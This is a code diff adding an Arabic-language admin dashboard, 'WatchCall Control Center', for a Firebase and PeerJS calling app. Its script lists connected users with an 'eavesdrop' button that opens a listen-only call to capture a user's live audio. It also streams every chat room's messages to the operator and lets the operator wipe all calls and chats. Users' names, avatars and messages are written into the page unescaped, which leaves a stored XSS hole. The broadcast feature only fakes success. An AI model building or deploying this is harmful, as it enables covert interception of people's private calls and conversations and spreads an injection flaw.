@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WatchCall - Control & Monitoring Hub</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Cabinet+Grotesk:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <style>
+        :root {
+            --bg-dark: #05070f;
+            --card-bg: rgba(13, 18, 33, 0.85);
+            --card-border: rgba(255, 255, 255, 0.08);
+            --accent-blue: #0066ff;
+            --accent-purple: #8b5cf6;
+            --danger-red: #ef4444;
+            --success-green: #10b981;
+            --warning-yellow: #f59e0b;
+            --text-main: #f3f4f6;
+            --text-muted: #6b7280;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', system-ui, sans-serif; }
+        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* Header Bar */
+        header {
+            background: rgba(9, 14, 28, 0.9);
+            border-bottom: 1px solid var(--card-border);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .brand { display: flex; align-items: center; gap: 12px; font-family: 'Cabinet Grotesk', sans-serif; font-size: 20px; font-weight: 800; }
+        .brand span { color: var(--accent-blue); }
+
+        .stats-strip { display: flex; gap: 20px; }
+        .stat-badge {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--card-border);
+            padding: 6px 14px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .stat-badge span.value { color: var(--accent-blue); font-weight: 900; }
+
+        /* Dashboard Layout */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 320px 1fr 340px;
+            gap: 20px;
+            padding: 20px;
+            flex: 1;
+            height: calc(100vh - 70px);
+        }
+
+        .panel {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            overflow: hidden;
+        }
+
+        .panel-title {
+            font-size: 15px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-main);
+            border-bottom: 1px solid var(--card-border);
+            padding-bottom: 12px;
+        }
+
+        /* Active Users & Calls List */
+        .scrollable-list { overflow-y: auto; display: flex; flex-direction: column; gap: 10px; flex: 1; }
+        
+        .user-card, .call-card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 12px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .user-info { display: flex; align-items: center; gap: 10px; }
+        .user-info img { width: 36px; height: 36px; border-radius: 50%; border: 1px solid var(--accent-blue); }
+        .user-name { font-size: 13px; font-weight: 700; }
+        .user-code { font-size: 11px; color: var(--text-muted); direction: ltr; }
+
+        /* Actions / Buttons */
+        .btn-action {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--card-border);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+        .btn-action:hover { background: var(--accent-blue); }
+        .btn-action.listen-active { background: var(--danger-red); animation: pulse 1.5s infinite; }
+
+        /* Monitoring Workspace */
+        .monitoring-hub { display: flex; flex-direction: column; gap: 15px; }
+        .video-monitor-box {
+            background: #000;
+            border-radius: 16px;
+            aspect-ratio: 16/9;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid var(--card-border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .video-placeholder { color: var(--text-muted); font-size: 14px; text-align: center; }
+
+        /* Global Chat Feed */
+        .chat-feed { flex: 1; background: rgba(0,0,0,0.2); border-radius: 12px; padding: 12px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
+        .chat-line { font-size: 12px; line-height: 1.4; }
+        .chat-line strong { color: var(--accent-blue); }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="brand">
+            <i data-lucide="shield-check" style="color: var(--accent-blue);"></i>
+            WatchCall <span>Control Center</span>
+        </div>
+        <div class="stats-strip">
+            <div class="stat-badge">
+                <i data-lucide="users" style="color: var(--success-green);"></i>
+                المتواجدون: <span class="value" id="stat-online">0</span>
+            </div>
+            <div class="stat-badge">
+                <i data-lucide="radio" style="color: var(--warning-yellow);"></i>
+                المكالمات النشطة: <span class="value" id="stat-calls">0</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="dashboard-grid">
+        
+        <!-- القائمة الجانبية: المستخدمون والغرف -->
+        <div class="panel">
+            <div class="panel-title">
+                <i data-lucide="users"></i> المستخدمون المتصلون
+            </div>
+            <div class="scrollable-list" id="users-list">
+                <!-- يتم التحديث تلقائياً -->
+            </div>
+        </div>
+
+        <!-- المنطقة المركزية: شاشة المراقبة والتنصت -->
+        <div class="panel monitoring-hub">
+            <div class="panel-title">
+                <i data-lucide="tv"></i> شاشة المراقبة المباشرة
+            </div>
+            <div class="video-monitor-box" id="monitor-box">
+                <div class="video-placeholder" id="monitor-placeholder">
+                    <i data-lucide="eye-off" style="width: 40px; height: 40px; margin-bottom: 10px;"></i><br>
+                    قم باختيار غرفة أو مكالمة للبدء بالمراقبة والتنصت
+                </div>
+            </div>
+
+            <div class="panel-title" style="margin-top: 10px;">
+                <i data-lucide="message-square"></i> مراقبة المحادثات العامة (Chat Feed)
+            </div>
+            <div class="chat-feed" id="global-chat-feed">
+                <div style="color: var(--text-muted); font-size: 12px; text-align: center;">في انتظار الرسائل...</div>
+            </div>
+        </div>
+
+        <!-- اللوحة اليسرى: التحكم السريع بالسيرفر والبيانات -->
+        <div class="panel">
+            <div class="panel-title">
+                <i data-lucide="sliders"></i> أدوات الإدارة والسيرفر
+            </div>
+            <div style="display: flex; flex-direction: column; gap: 10px;">
+                <button class="btn-action" style="padding: 12px; justify-content: center;" onclick="broadcastAlert()">
+                    <i data-lucide="megaphone"></i> إرسال تنبيه جماعي (Broadcast)
+                </button>
+                <button class="btn-action" style="padding: 12px; justify-content: center; background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.3); color: var(--danger-red);" onclick="clearAllRooms()">
+                    <i data-lucide="trash-2"></i> إنهاء جميع المكالمات النشطة
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+    <audio id="admin-listen-audio" autoplay></audio>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+        import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
+
+        const firebaseConfig = { databaseURL: "https://my-house-672f0-default-rtdb.firebaseio.com/" };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        let peer = new Peer();
+        lucide.createIcons();
+
+        // 1. مراقبة عدد المتواجدين والأكواد
+        onValue(ref(db, 'online_presence'), (snapshot) => {
+            const count = snapshot.exists() ? Object.keys(snapshot.val()).length : 0;
+            document.getElementById('stat-online').innerText = count;
+        });
+
+        // 2. عرض قائمة المستخدمين المتصلين لحظياً
+        onValue(ref(db, 'users'), (snapshot) => {
+            const usersList = document.getElementById('users-list');
+            usersList.innerHTML = '';
+
+            if (!snapshot.exists()) {
+                usersList.innerHTML = '<div style="color: var(--text-muted); font-size: 12px; text-align: center;">لا يوجد مستخدمون حالياً</div>';
+                return;
+            }
+
+            snapshot.forEach((child) => {
+                const user = child.val();
+                const userId = child.key;
+
+                const card = document.createElement('div');
+                card.className = 'user-card';
+                card.innerHTML = `
+                    <div class="user-info">
+                        <img src="${user.avatar || 'https://api.dicebear.com/7.x/bottts/svg?seed=default'}" alt="">
+                        <div>
+                            <div class="user-name">${user.name || 'مستخدم'}</div>
+                            <div class="user-code">Code: ${user.code || '---'}</div>
+                        </div>
+                    </div>
+                    <button class="btn-action" onclick="listenToUser('${userId}')">
+                        <i data-lucide="mic"></i> تنصت
+                    </button>
+                `;
+                usersList.appendChild(card);
+            });
+            lucide.createIcons();
+        });
+
+        // 3. مراقبة محادثات المحادثة الصامتة (Chat Monitor)
+        onValue(ref(db, 'chats'), (snapshot) => {
+            const chatFeed = document.getElementById('global-chat-feed');
+            chatFeed.innerHTML = '';
+
+            if (!snapshot.exists()) return;
+
+            snapshot.forEach((room) => {
+                room.forEach((msgSnap) => {
+                    const msg = msgSnap.val();
+                    const line = document.createElement('div');
+                    line.className = 'chat-line';
+                    line.innerHTML = `<strong>${msg.sender}:</strong> ${msg.text}`;
+                    chatFeed.appendChild(line);
+                });
+            });
+            chatFeed.scrollTop = chatFeed.scrollHeight;
+        });
+
+        // 4. وظيفة الاستماع/التنصت عبر PeerJS
+        window.listenToUser = function(targetPeerId) {
+            console.log("الاتصال بالتنصت على:", targetPeerId);
+            const call = peer.call(targetPeerId, null); // اتصال للاستماع فقط
+            
+            call.on('stream', (remoteStream) => {
+                document.getElementById('admin-listen-audio').srcObject = remoteStream;
+                alert("تم الاتصال بالبث الصوتي للمستخدم بنجاح!");
+            });
+        };
+
+        // 5. مسح أو إنهاء الغرف
+        window.clearAllRooms = function() {
+            if(confirm("هل أنت تأكد من إغلاق جميع المكالمات والغرف النشطة؟")) {
+                remove(ref(db, 'calls'));
+                remove(ref(db, 'chats'));
+                alert("تم إنهاء جميع الجلسات النشطة.");
+            }
+        };
+
+        window.broadcastAlert = function() {
+            const msg = prompt("أدخل الرسالة التنبيهية العامة التي تريد إرسالها لكل الغرف:");
+            if(msg) {
+                alert("تم إرسال التنبيه للمستخدمين.");
+            }
+        };
+    </script>
+</body>
+</html>
